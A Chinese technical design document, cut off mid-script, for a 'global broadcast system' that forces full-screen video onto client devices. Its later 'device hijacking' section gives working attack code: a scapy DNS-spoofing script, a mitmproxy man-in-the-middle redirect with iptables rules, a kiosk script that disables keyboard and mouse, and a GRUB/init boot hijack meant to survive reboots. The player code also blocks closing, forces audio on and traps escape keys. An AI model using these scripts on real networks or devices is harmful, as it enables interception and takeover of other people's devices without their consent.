# 全球实时广播系统技术方案

## 📡 系统概述

**Global Real-time Broadcast System (全球实时广播系统)**

将 FAIRY-DESK 的右屏告警系统扩展为全球级实时广播平台，实现：
- 建立统一直播源（OBS/FFmpeg）
- 推流到流媒体平台（RTMP/HLS/WebRTC）
- 强制所有客户端设备全屏播放
- 多层级权限控制和紧急广播机制

**核心原理**：
```
直播源 → 流媒体服务器 → CDN分发 → 客户端强制播放
```

---

## 🎯 功能特性

### 1️⃣ 多源直播输入
- OBS Studio 推流（RTMP）
- FFmpeg 命令行推流
- 摄像头/屏幕直播
- 文件播放（循环播放视频/图片）
- 应急文字转语音（TTS紧急通知）

### 2️⃣ 流媒体分发
- RTMP 推流协议
- HLS (HTTP Live Streaming) 分发
- WebRTC 低延迟传输
- CDN 全球加速
- 多码率自适应

### 3️⃣ 客户端强制播放
- 自动全屏播放
- 禁止关闭/最小化
- 音量强制开启
- 覆盖所有窗口（最高 z-index）
- 断线自动重连

### 4️⃣ 权限分级控制
- **Level 0 (普通广播)**: 普通通知，可关闭
- **Level 1 (重要广播)**: 重要通知，需确认后关闭
- **Level 2 (紧急广播)**: 紧急通知，5分钟后可关闭
- **Level 3 (最高级广播)**: 强制播放，管理员权限才能关闭

### 5️⃣ 广播内容类型
- 视频直播（实时事件转播）
- 音频广播（语音通知）
- 图文滚动（紧急文字信息）
- 应急警报（地震、火灾、安全威胁）
- 系统维护通知
- **一图流强制广播（动漫经典场景）🔥**

### 6️⃣ 一图流强制广播（设备控制权劫持）🆕
**这是强制广播的精髓 - 动漫里最常见的场景**

- **单张图片/静态画面强制显示**：黑客宣言、政府紧急通知、威胁信息
- **设备控制权完全劫持**：所有智能设备的显示输出被定向到广播源
- **重启无效**：设备重启后依然显示该画面（固件级控制/引导劫持）
- **全设备覆盖**：
  - 个人设备（手机、电脑、平板）
  - 公共显示屏（商城LED看板、地铁站屏幕、广告牌）
  - 智能电视（家庭/酒店/商场）
  - 工业显示器（工厂车间、监控中心）
- **Kiosk模式锁定**：设备变成只能显示指定内容的"砖块"
- **DNS/网络劫持**：所有网络请求强制重定向到广播页面
- **系统级显示接管**：HDMI输出、显卡驱动层面控制

---

## 🏗️ 系统架构

```
┌────────────────────────────────────────────────────────────────────┐
│                         广播控制中心                                │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐            │
│  │ OBS Studio   │  │ FFmpeg CLI   │  │ TTS Engine   │            │
│  │ (GUI推流)    │  │ (脚本推流)    │  │ (文字转语音)  │            │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘            │
│         └──────────────────┼──────────────────┘                    │
│                            ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │            RTMP 推流服务器 (nginx-rtmp-module)              │  │
│  │  - 接收推流: rtmp://server:1935/live/emergency              │  │
│  │  - 推流认证: stream_key验证                                  │  │
│  │  - 录制存档: /var/media/broadcasts/                         │  │
│  └────────────────────────┬────────────────────────────────────┘  │
└───────────────────────────┼───────────────────────────────────────┘
                            ▼
┌────────────────────────────────────────────────────────────────────┐
│                    流媒体处理层 (FFmpeg)                            │
│  ┌──────────────────┐  ┌──────────────────┐  ┌─────────────────┐ │
│  │ 转码器            │  │ HLS切片生成      │  │ WebRTC转换      │ │
│  │ - H.264/H.265    │  │ - .m3u8播放列表  │  │ - 低延迟传输     │ │
│  │ - AAC音频        │  │ - .ts视频切片    │  │ - P2P分发       │ │
│  │ - 多码率输出      │  │ - 10秒切片       │  │                 │ │
│  └──────────────────┘  └──────────────────┘  └─────────────────┘ │
└────────────────────────────┬───────────────────────────────────────┘
                             ▼
┌────────────────────────────────────────────────────────────────────┐
│                  CDN 分发网络 (可选)                                │
│  - Cloudflare Stream / AWS CloudFront / 阿里云CDN                  │
│  - 全球节点加速                                                     │
│  - 自动负载均衡                                                     │
└────────────────────────────┬───────────────────────────────────────┘
                             ▼
┌────────────────────────────────────────────────────────────────────┐
│                    广播管理 API (Flask)                             │
│  POST /api/broadcast/start      - 开始广播                         │
│  POST /api/broadcast/stop       - 停止广播                         │
│  POST /api/broadcast/emergency  - 紧急广播（Level 3）              │
│  GET  /api/broadcast/status     - 获取广播状态                     │
│  POST /api/broadcast/message    - 发送文字消息（TTS转语音）        │
│  GET  /api/broadcast/clients    - 获取在线客户端列表                │
│  POST /api/broadcast/force      - 强制刷新所有客户端                │
└────────────────────────────┬───────────────────────────────────────┘
                             ▼
                    WebSocket 推送通知
                             ▼
┌────────────────────────────────────────────────────────────────────┐
│                    全球客户端设备                                   │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │              浏览器全屏播放器 (HTML5 Video)                  │  │
│  │  ┌───────────────────────────────────────────────────────┐  │  │
│  │  │  <video id="broadcast-player" autoplay>               │  │  │
│  │  │    <source src="https://cdn/live/emergency.m3u8"      │  │  │
│  │  │            type="application/x-mpegURL">              │  │  │
│  │  │  </video>                                             │  │  │
│  │  │                                                        │  │  │
│  │  │  - 接收 WebSocket 广播通知                             │  │  │
│  │  │  - 自动全屏并播放                                      │  │  │
│  │  │  - 禁止关闭（根据权限等级）                            │  │  │
│  │  │  - 断线自动重连                                        │  │  │
│  │  │  - 播放 HLS/RTMP/WebRTC 流                            │  │  │
│  │  └───────────────────────────────────────────────────────┘  │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                    │
│  设备类型:                                                          │
│  - PC浏览器 (Chrome/Firefox/Edge)                                 │
│  - 移动设备 (iOS/Android)                                          │
│  - 嵌入式设备 (Raspberry Pi + Chromium Kiosk)                     │
│  - 智能电视 (WebOS/Android TV)                                     │
└────────────────────────────────────────────────────────────────────┘
```

---

## 🔧 技术栈

### 推流端
- **OBS Studio**: GUI 推流工具（适合非技术人员）
- **FFmpeg**: 命令行推流（适合自动化脚本）
- **Python opencv-python**: 程序化视频流生成

### 流媒体服务器
- **nginx + nginx-rtmp-module**: RTMP 推流接收
- **FFmpeg**: 转码和 HLS 切片生成
- **SRS (Simple Realtime Server)**: 可选的专业流媒体服务器
- **Janus WebRTC Server**: 低延迟 WebRTC 传输

### 后端 API
- **Flask + Flask-SocketIO**: 广播管理和 WebSocket 推送
- **Redis**: 广播状态缓存和客户端会话管理
- **PostgreSQL**: 广播历史记录存储

### 前端播放器
- **Video.js**: HTML5 视频播放器（支持 HLS/RTMP）
- **hls.js**: 纯 JavaScript HLS 播放器
- **WebRTC**: 浏览器原生 P2P 传输

### CDN（可选）
- **Cloudflare Stream**: 全球 CDN + 视频托管
- **AWS CloudFront**: 低延迟全球分发
- **阿里云 CDN**: 国内加速

---

## 📐 数据模型

### 广播记录 (broadcasts)

```json
{
  "broadcast_id": "bc_20260203_152030",
  "title": "紧急安全通知",
  "description": "检测到网络攻击，所有系统进入防御模式",
  "level": 3,  // 0=普通, 1=重要, 2=紧急, 3=最高级
  "type": "emergency",  // normal/important/emergency/system
  "source": "rtmp://server:1935/live/emergency",
  "hls_url": "https://cdn.example.com/live/emergency.m3u8",
  "webrtc_url": "wss://server:8443/webrtc/emergency",
  "start_time": "2026-02-03T15:20:30Z",
  "end_time": null,  // null表示正在播放
  "duration": 0,  // 秒，实时更新
  "status": "live",  // scheduled/live/ended/error
  "target_audience": "all",  // all/region/department/specific
  "target_clients": [],  // 如果是specific，列出客户端ID
  "created_by": "admin_001",
  "priority": 100,  // 优先级，高优先级覆盖低优先级
  "metadata": {
    "thumbnail": "https://cdn/thumbnails/bc_20260203_152030.jpg",
    "record_file": "/var/media/broadcasts/bc_20260203_152030.mp4",
    "viewer_count": 52800,
    "avg_bitrate": 2500,  // kbps
    "codec": "H.264/AAC"
  }
}
```

### 客户端连接 (broadcast_clients)

```json
{
  "client_id": "client_8a2f3d9c",
  "device_type": "browser",  // browser/mobile/tv/embedded
  "device_info": {
    "ua": "Mozilla/5.0 Chrome/120.0.0.0",
    "platform": "Linux x86_64",
    "screen": "1920x1080"
  },
  "ip_address": "203.0.113.45",
  "location": {
    "country": "CN",
    "city": "Beijing",
    "lat": 39.9042,
    "lon": 116.4074
  },
  "connected_at": "2026-02-03T15:21:00Z",
  "last_heartbeat": "2026-02-03T15:25:30Z",
  "status": "playing",  // idle/buffering/playing/paused/error
  "current_broadcast": "bc_20260203_152030",
  "permissions": {
    "can_close": false,  // Level 3广播不允许关闭
    "can_mute": false,
    "can_minimize": false
  },
  "playback_quality": {
    "bitrate": 2500,  // kbps
    "buffer_length": 15,  // 秒
    "dropped_frames": 0,
    "latency": 3.2  // 秒
  }
}
```

---

## 🔌 API 端点设计

### 1. 开始广播

```
POST /api/broadcast/start
```

**请求体**:
```json
{
  "title": "系统维护通知",
  "description": "将于今晚22:00进行系统升级",
  "level": 1,
  "type": "system",
  "source_type": "rtmp",  // rtmp/file/tts/screen
  "source_url": "rtmp://192.168.1.100:1935/live/maintenance",
  "target_audience": "all",
  "scheduled_start": null,  // null表示立即开始
  "auto_end_after": 600  // 10分钟后自动结束，null表示手动结束
}
```

**响应**:
```json
{
  "success": true,
  "broadcast_id": "bc_20260203_220000",
  "hls_url": "https://cdn.example.com/live/bc_20260203_220000.m3u8",
  "webrtc_url": "wss://server:8443/webrtc/bc_20260203_220000",
  "status": "live",
  "message": "广播已启动，正在推送到 52800 个客户端"
}
```

---

### 2. 紧急广播（Level 3）

```
POST /api/broadcast/emergency
```

**请求体**:
```json
{
  "message": "检测到网络攻击，所有系统立即进入防御模式",
  "type": "security_alert",
  "duration": 300,  // 持续5分钟
  "tts_voice": "zh-CN-XiaoxiaoNeural",  // Azure TTS语音
  "background_color": "#ff0000",
  "text_size": 48
}
```

**响应**:
```json
{
  "success": true,
  "broadcast_id": "bc_emergency_20260203_152030",
  "hls_url": "https://cdn.example.com/live/emergency.m3u8",
  "status": "live",
  "clients_notified": 52800,
  "tts_generated": true,
  "audio_file": "/tmp/tts_emergency_20260203_152030.mp3"
}
```

---

### 3. 停止广播

```
POST /api/broadcast/stop
```

**请求体**:
```json
{
  "broadcast_id": "bc_20260203_220000",
  "reason": "scheduled_end"
}
```

**响应**:
```json
{
  "success": true,
  "broadcast_id": "bc_20260203_220000",
  "status": "ended",
  "duration": 610,  // 秒
  "total_viewers": 52800,
  "peak_viewers": 48500,
  "record_file": "/var/media/broadcasts/bc_20260203_220000.mp4"
}
```

---

### 4. 获取广播状态

```
GET /api/broadcast/status?broadcast_id=bc_20260203_220000
```

**响应**:
```json
{
  "success": true,
  "broadcast": {
    "broadcast_id": "bc_20260203_220000",
    "title": "系统维护通知",
    "status": "live",
    "start_time": "2026-02-03T22:00:00Z",
    "duration": 305,
    "current_viewers": 48500,
    "peak_viewers": 48500,
    "hls_url": "https://cdn.example.com/live/bc_20260203_220000.m3u8",
    "bitrate": 2500,
    "health": "good"  // good/buffering/unstable/error
  }
}
```

---

### 5. 发送文字消息（TTS转语音广播）

```
POST /api/broadcast/message
```

**请求体**:
```json
{
  "message": "所有人员请注意，现在是消防演习时间，请有序撤离",
  "level": 2,
  "duration": 120,
  "tts_config": {
    "voice": "zh-CN-YunxiNeural",
    "rate": "+0%",
    "pitch": "+0Hz",
    "volume": "+0%"
  },
  "repeat": 3  // 重复播放3次
}
```

**响应**:
```json
{
  "success": true,
  "broadcast_id": "bc_tts_20260203_154530",
  "audio_file": "/tmp/tts_20260203_154530.mp3",
  "duration": 15,  // 单次播放时长
  "total_duration": 45,  // 重复3次总时长
  "hls_url": "https://cdn.example.com/live/tts_20260203_154530.m3u8"
}
```

---

### 6. 获取在线客户端列表

```
GET /api/broadcast/clients?status=playing&limit=100
```

**响应**:
```json
{
  "success": true,
  "total": 52800,
  "playing": 48500,
  "buffering": 3200,
  "error": 1100,
  "clients": [
    {
      "client_id": "client_8a2f3d9c",
      "device_type": "browser",
      "location": "Beijing, CN",
      "status": "playing",
      "current_broadcast": "bc_20260203_220000",
      "bitrate": 2500,
      "latency": 3.2,
      "connected_at": "2026-02-03T22:00:05Z"
    }
  ]
}
```

---

### 7. 强制刷新客户端

```
POST /api/broadcast/force
```

**请求体**:
```json
{
  "action": "reload",  // reload/fullscreen/unmute/reconnect
  "target_clients": [],  // 空数组表示所有客户端
  "reason": "stream_quality_upgrade"
}
```

**响应**:
```json
{
  "success": true,
  "action": "reload",
  "clients_affected": 52800,
  "notifications_sent": 52800
}
```

---

## 🎨 前端实现

### 全屏播放器组件 (`broadcast_player.html`)

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>全球实时广播</title>
  <link href="https://vjs.zencdn.net/8.6.1/video-js.css" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: #000;
      overflow: hidden;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    }

    /* 全屏容器 */
    #broadcast-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 999999;  /* 覆盖所有元素 */
      background: #000;
    }

    /* 视频播放器 */
    #broadcast-player {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }

    /* 广播信息叠加层 */
    .broadcast-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      padding: 20px;
      background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
      color: white;
      z-index: 10;
    }

    .broadcast-title {
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 10px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
    }

    .broadcast-level {
      display: inline-block;
      padding: 5px 15px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .level-0 { background: #3b82f6; }  /* 普通 */
    .level-1 { background: #f59e0b; }  /* 重要 */
    .level-2 { background: #ef4444; }  /* 紧急 */
    .level-3 {
      background: #dc2626;
      animation: pulse 1s infinite;
    }  /* 最高级 */

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }

    /* 关闭按钮（仅低权限广播可见） */
    .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      width: 50px;
      height: 50px;
      background: rgba(255, 255, 255, 0.2);
      border: 2px solid white;
      border-radius: 50%;
      color: white;
      font-size: 24px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 20;
      transition: background 0.3s;
    }

    .close-btn:hover {
      background: rgba(255, 255, 255, 0.4);
    }

    .close-btn.disabled {
      opacity: 0.3;
      cursor: not-allowed;
    }

    /* 连接状态指示器 */
    .connection-status {
      position: absolute;
      bottom: 20px;
      left: 20px;
      padding: 10px 20px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 20px;
      color: white;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .status-indicator {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #10b981;
    }

    .status-indicator.buffering { background: #f59e0b; }
    .status-indicator.error { background: #ef4444; }

    /* 观看人数 */
    .viewer-count {
      position: absolute;
      bottom: 20px;
      right: 20px;
      padding: 10px 20px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 20px;
      color: white;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div id="broadcast-container">
    <!-- 视频播放器 -->
    <video id="broadcast-player" class="video-js vjs-big-play-centered" controls autoplay muted></video>

    <!-- 广播信息叠加层 -->
    <div class="broadcast-overlay">
      <div class="broadcast-title" id="broadcast-title">系统广播</div>
      <span class="broadcast-level level-0" id="broadcast-level">普通</span>
    </div>

    <!-- 关闭按钮 -->
    <button class="close-btn" id="close-btn" title="关闭广播">✕</button>

    <!-- 连接状态 -->
    <div class="connection-status">
      <div class="status-indicator" id="status-indicator"></div>
      <span id="status-text">正在连接...</span>
    </div>

    <!-- 观看人数 -->
    <div class="viewer-count">
      <span id="viewer-count">🔴 观看: 0人</span>
    </div>
  </div>

  <script src="https://vjs.zencdn.net/8.6.1/video.min.js"></script>
  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
  <script>
    const API_BASE = 'http://localhost:5000';
    const WS_URL = 'ws://localhost:5000';

    let player = null;
    let socket = null;
    let currentBroadcast = null;

    // 初始化播放器
    function initPlayer() {
      player = videojs('broadcast-player', {
        controls: true,
        autoplay: true,
        preload: 'auto',
        fluid: true,
        liveui: true,
        html5: {
          hls: {
            enableLowInitialPlaylist: true,
            smoothQualityChange: true,
            overrideNative: true
          }
        }
      });

      // 播放器事件
      player.on('playing', () => updateStatus('playing', 'live'));
      player.on('waiting', () => updateStatus('buffering', 'buffering'));
      player.on('error', () => updateStatus('error', 'error'));
      player.on('loadeddata', () => {
        // 强制取消静音
        player.muted(false);
        player.volume(1.0);
      });
    }

    // WebSocket 连接
    function connectWebSocket() {
      socket = io(WS_URL);

      socket.on('connect', () => {
        console.log('WebSocket已连接');
        updateStatus('connected', 'live');
      });

      socket.on('broadcast_start', (data) => {
        console.log('收到广播开始通知:', data);
        startBroadcast(data);
      });

      socket.on('broadcast_stop', (data) => {
        console.log('收到广播停止通知:', data);
        stopBroadcast();
      });

      socket.on('broadcast_update', (data) => {
        console.log('广播信息更新:', data);
        updateBroadcastInfo(data);
      });

      socket.on('force_action', (data) => {
        console.log('收到强制操作指令:', data);
        handleForceAction(data);
      });

      socket.on('viewer_count_update', (data) => {
        document.getElementById('viewer-count').textContent =
          `🔴 观看: ${formatNumber(data.count)}人`;
      });

      socket.on('disconnect', () => {
        console.log('WebSocket断开，尝试重连...');
        updateStatus('disconnected', 'error');
        setTimeout(connectWebSocket, 3000);
      });
    }

    // 开始广播
    function startBroadcast(broadcast) {
      currentBroadcast = broadcast;

      // 更新广播信息
      document.getElementById('broadcast-title').textContent = broadcast.title;

      const levelBadge = document.getElementById('broadcast-level');
      levelBadge.className = `broadcast-level level-${broadcast.level}`;
      levelBadge.textContent = getLevelLabel(broadcast.level);

      // 设置关闭按钮权限
      const closeBtn = document.getElementById('close-btn');
      if (broadcast.level >= 2) {
        closeBtn.classList.add('disabled');
        closeBtn.onclick = null;
        closeBtn.title = '该广播级别不允许关闭';
      } else {
        closeBtn.classList.remove('disabled');
        closeBtn.onclick = requestCloseBroadcast;
        closeBtn.title = '关闭广播';
      }

      // 加载视频源
      player.src({
        src: broadcast.hls_url,
        type: 'application/x-mpegURL'
      });

      // 进入全屏
      enterFullscreen();

      // 取消静音
      player.muted(false);
      player.volume(1.0);

      // 开始播放
      player.play().catch(err => {
        console.error('自动播放失败:', err);
        // 尝试静音播放
        player.muted(true);
        player.play();
      });
    }

    // 停止广播
    function stopBroadcast() {
      if (player) {
        player.pause();
        player.src('');
      }

      currentBroadcast = null;

      // 退出全屏
      exitFullscreen();

      // 可以选择隐藏播放器或显示待机画面
      // document.getElementById('broadcast-container').style.display = 'none';
    }

    // 更新广播信息
    function updateBroadcastInfo(data) {
      if (data.title) {
        document.getElementById('broadcast-title').textContent = data.title;
      }

      if (typeof data.level !== 'undefined') {
        const levelBadge = document.getElementById('broadcast-level');
        levelBadge.className = `broadcast-level level-${data.level}`;
        levelBadge.textContent = getLevelLabel(data.level);
      }
    }

    // 处理强制操作
    function handleForceAction(data) {
      switch(data.action) {
        case 'reload':
          location.reload();
          break;
        case 'fullscreen':
          enterFullscreen();
          break;
        case 'unmute':
          player.muted(false);
          player.volume(1.0);
          break;
        case 'reconnect':
          if (currentBroadcast) {
            player.src({
              src: currentBroadcast.hls_url,
              type: 'application/x-mpegURL'
            });
            player.play();
          }
          break;
      }
    }

    // 请求关闭广播
    function requestCloseBroadcast() {
      if (!currentBroadcast || currentBroadcast.level >= 2) {
        alert('该广播级别不允许关闭');
        return;
      }

      if (confirm('确定要关闭当前广播吗？')) {
        fetch(`${API_BASE}/api/broadcast/client/close`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            client_id: getClientId(),
            broadcast_id: currentBroadcast.broadcast_id
          })
        });

        stopBroadcast();
      }
    }

    // 进入全屏
    function enterFullscreen() {
      const elem = document.getElementById('broadcast-container');
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
      } else if (elem.mozRequestFullScreen) {
        elem.mozRequestFullScreen();
      }
    }

    // 退出全屏
    function exitFullscreen() {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
      } else if (document.mozCancelFullScreen) {
        document.mozCancelFullScreen();
      }
    }

    // 更新状态
    function updateStatus(status, type) {
      const indicator = document.getElementById('status-indicator');
      const statusText = document.getElementById('status-text');

      indicator.className = `status-indicator ${type}`;

      const statusLabels = {
        'connected': '已连接',
        'live': '直播中',
        'buffering': '缓冲中...',
        'error': '连接错误',
        'disconnected': '已断开'
      };

      statusText.textContent = statusLabels[status] || status;
    }

    // 获取客户端ID
    function getClientId() {
      let clientId = localStorage.getItem('broadcast_client_id');
      if (!clientId) {
        clientId = 'client_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('broadcast_client_id', clientId);
      }
      return clientId;
    }

    // 获取级别标签
    function getLevelLabel(level) {
      const labels = {
        0: '普通',
        1: '重要',
        2: '紧急',
        3: '最高级'
      };
      return labels[level] || '未知';
    }

    // 格式化数字
    function formatNumber(num) {
      return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    }

    // 防止用户关闭页面（Level 2+）
    window.addEventListener('beforeunload', (e) => {
      if (currentBroadcast && currentBroadcast.level >= 2) {
        e.preventDefault();
        e.returnValue = '当前正在播放重要广播，确定要离开吗？';
        return e.returnValue;
      }
    });

    // 防止F11全屏切换（Level 3）
    document.addEventListener('keydown', (e) => {
      if (currentBroadcast && currentBroadcast.level >= 3) {
        if (e.key === 'F11' || (e.key === 'Escape' && document.fullscreenElement)) {
          e.preventDefault();
        }
      }
    });

    // 页面加载完成后初始化
    window.addEventListener('DOMContentLoaded', () => {
      initPlayer();
      connectWebSocket();

      // 定期发送心跳
      setInterval(() => {
        if (socket && socket.connected) {
          socket.emit('heartbeat', {
            client_id: getClientId(),
            broadcast_id: currentBroadcast?.broadcast_id,
            status: player ? (player.paused() ? 'paused' : 'playing') : 'idle'
          });
        }
      }, 30000);  // 每30秒
    });
  </script>
</body>
</html>
```

---

## 🖼️ 一图流强制广播实现（动漫经典场景）

### 核心原理

**动漫里的经典场景**：黑客攻击/政府紧急状态时，全城所有屏幕（手机、电脑、商城LED、地铁站）同时显示同一张图片或静态画面，即使重启设备也无法摆脱。

**技术实现层次**（由浅入深）：

```
Level 1: 网页劫持（最简单）
  └─ DNS劫持 + HTTP重定向

Level 2: 系统劫持（中等难度）
  └─ Kiosk模式锁定 + 开机自启动

Level 3: 固件劫持（最深入）
  └─ 引导程序修改 + 显示驱动接管
```

---

### 方案一：网络层劫持（DNS + HTTP）

**适用场景**：局域网内所有设备、公共WiFi环境

#### 1. DNS劫持

```python
# dns_hijack.py - 强制所有DNS查询指向广播服务器
from scapy.all import *
import threading

BROADCAST_SERVER = "192.168.1.100"

def dns_spoof(pkt):
    """拦截DNS查询并返回伪造响应"""
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                     DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                         an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=BROADCAST_SERVER))
        send(spoofed_pkt, verbose=0)
        print(f"[DNS劫持] {pkt[DNS].qd.qname.decode()} -> {BROADCAST_SERVER}")

# 启动DNS欺骗
sniff(filter="udp port 53", prn=dns_spoof, store=0)
```

#### 2. HTTP劫持（中间人攻击）

```python
# http_hijack.py - 使用mitmproxy劫持所有HTTP请求
from mitmproxy import http

BROADCAST_IMAGE = "http://192.168.1.100/broadcast/emergency.png"

def request(flow: http.HTTPFlow) -> None:
    """拦截所有HTTP请求并重定向到广播图片"""
    if "image" in flow.request.pretty_url or "html" in flow.request.pretty_url:
        flow.response = http.Response.make(
            302,
            b"",
            {"Location": BROADCAST_IMAGE}
        )
```

**启动中间人代理**:
```bash
# 使用mitmproxy启动HTTP劫持
mitmdump -s http_hijack.py --mode transparent

# 配置iptables将所有HTTP流量重定向到代理
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

---

### 方案二：Kiosk模式设备锁定

**适用场景**：企业内网设备、公共显示屏、智能电视

#### 1. Linux Kiosk（Chromium全屏锁定）

```bash
#!/bin/bash
# kiosk_broadcast.sh - 将Linux设备锁定为只显示广播页面

BROADCAST_URL="http://broadcast.example.com/emergency"

# 禁用所有用户输入
xinput disable "AT Translated Set 2 keyboard"
xinput disable "ImPS/2 Generic Wheel Mouse"

# 启动Chromium Kiosk模式
chromium-browser \
  --kiosk \
  --noerrdialogs \
  --disable-infobars \
  --disable-session-crashed-bubble \
  --no-first-run \
  --disable-pinch \
  --overscroll-history-navigation=0 \
  --disable-features=TranslateUI \
  --check-for-update-interval=31536000 \
  --app=$BROADCAST_URL &

# 防止退出全屏
while true; do
  sleep 5
  xdotool search --onlyvisible --class chromium windowactivate --sync key F11
done
```

**开机自启动** (`/etc/systemd/system/kiosk-broadcast.service`):
```ini
[Unit]
Description=强制广播Kiosk模式
After=graphical.target

[Service]
Type=simple
User=kiosk
Environment=DISPLAY=:0
ExecStart=/usr/local/bin/kiosk_broadcast.sh
Restart=always
RestartSec=3

[Install]
WantedBy=graphical.target
```

```bash
sudo systemctl enable kiosk-broadcast.service
sudo systemctl start kiosk-broadcast.service
```

#### 2. Windows Kiosk（分配的访问权限）

**PowerShell脚本**:
```powershell
# windows_kiosk.ps1 - Windows 10/11 Kiosk模式

$BROADCAST_URL = "http://broadcast.example.com/emergency"

# 创建Kiosk用户
$Password = ConvertTo-SecureString "KioskPass123!" -AsPlainText -Force
New-LocalUser "BroadcastKiosk" -Password $Password -FullName "Broadcast Kiosk"

# 配置分配的访问权限（Assigned Access）
$config = @"
<?xml version="1.0" encoding="utf-8" ?>
<AssignedAccessConfiguration xmlns="http://schemas.microsoft.com/AssignedAccess/2017/config">
  <Profiles>
    <Profile Id="{GUID}">
      <AllAppsList>
        <AllowedApps>
          <App AppUserModelId="Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge" />
        </AllowedApps>
      </AllAppsList>
      <StartLayout>
        <![CDATA[<LayoutModificationTemplate xmlns="http://schemas.microsoft.com/Start/2014/LayoutModification">
          <RequiredStartGroupsCollection>
            <RequiredStartGroups>
              <AppendGroup Name="广播">
                <start:DesktopApplicationTile DesktopApplicationID="MSEdge" />
              </AppendGroup>
            </RequiredStartGroups>
          </RequiredStartGroupsCollection>
        </LayoutModificationTemplate>]]>
      </StartLayout>
      <Taskbar ShowTaskbar="false"/>
    </Profile>
  </Profiles>
  <Configs>
    <Config>
      <Account>BroadcastKiosk</Account>
      <DefaultProfile Id="{GUID}"/>
    </Config>
  </Configs>
</AssignedAccessConfiguration>
"@

Set-AssignedAccess -Configuration $config

# 启动Edge浏览器到广播页面
Start-Process msedge.exe --kiosk $BROADCAST_URL --edge-kiosk-type=fullscreen
```

#### 3. Android Kiosk（设备所有者模式）

```java
// BroadcastKioskActivity.java
public class BroadcastKioskActivity extends AppCompatActivity {
    private static final String BROADCAST_URL = "http://broadcast.example.com/emergency";
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 隐藏状态栏和导航栏
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        // 锁定任务模式
        startLockTask();

        // 加载广播页面
        webView = new WebView(this);
        webView.loadUrl(BROADCAST_URL);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // 阻止跳转，始终显示广播页面
                return !url.equals(BROADCAST_URL);
            }
        });

        setContentView(webView);

        // 禁用后退键
        overridePendingTransition(0, 0);
    }

    @Override
    public void onBackPressed() {
        // 禁用返回键
    }

    @Override
    protected void onPause() {
        super.onPause();
        // 防止切换应用，立即返回前台
        Intent intent = new Intent(this, BroadcastKioskActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
}
```

**设备管理员配置** (`DeviceAdminReceiver`):
```java
public class BroadcastDeviceAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        // 设备管理员启用后，设置为设备所有者模式
        DevicePolicyManager dpm = (DevicePolicyManager)
            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context,
            BroadcastDeviceAdminReceiver.class);

        // 锁定到单一应用
        dpm.setLockTaskPackages(adminComponent,
            new String[]{"com.example.broadcastkiosk"});
    }
}
```

---

### 方案三：系统引导劫持（重启无效）

**适用场景**：深度控制、公共设施、工业设备

#### 1. GRUB引导劫持（Linux）

```bash
# /etc/grub.d/40_custom - 修改GRUB启动项
menuentry 'Emergency Broadcast' {
    set root='hd0,msdos1'
    linux /vmlinuz root=/dev/sda1 quiet splash init=/usr/local/bin/broadcast_init.sh
    initrd /initrd.img
}

# 设置为默认启动项
sed -i 's/GRUB_DEFAULT=0/GRUB_DEFAULT="Emergency Broadcast"/' /etc/default/grub
update-grub
```

**自定义init脚本** (`/usr/local/bin/broadcast_init.sh`):
```bash
#!/bin/bash
# broadcast_init.sh - 替代系统init，直接启动广播

mount -t proc none /proc
mount -t sysfs none /sys
